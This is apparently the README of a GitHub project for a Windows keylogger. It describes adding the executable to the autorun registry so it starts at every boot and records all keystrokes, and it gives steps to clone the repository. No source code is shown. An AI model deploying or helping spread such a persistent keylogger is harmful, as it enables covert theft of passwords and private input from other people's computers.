# Kακός_Keylogger
I am working on a project to simulate a keylogger with some level of persistence. The goal is to inject the executable into the autorun registry setting. This will allow the keylogger to start automatically every time the system boots up. By doing this, the kakos keylogger can record all keystrokes made on the system.

# Instructions

Navigate to https://git-scm.com/downloads and download Git for Windows.

Open command prompt. You do not need to "Run as Administrator".

Change directory to C:\

From C:\
C:\>git clone https://github.com/kakos1301/kAkOs_Keylogger.git

C:\>cd kAkOs_Keylogger
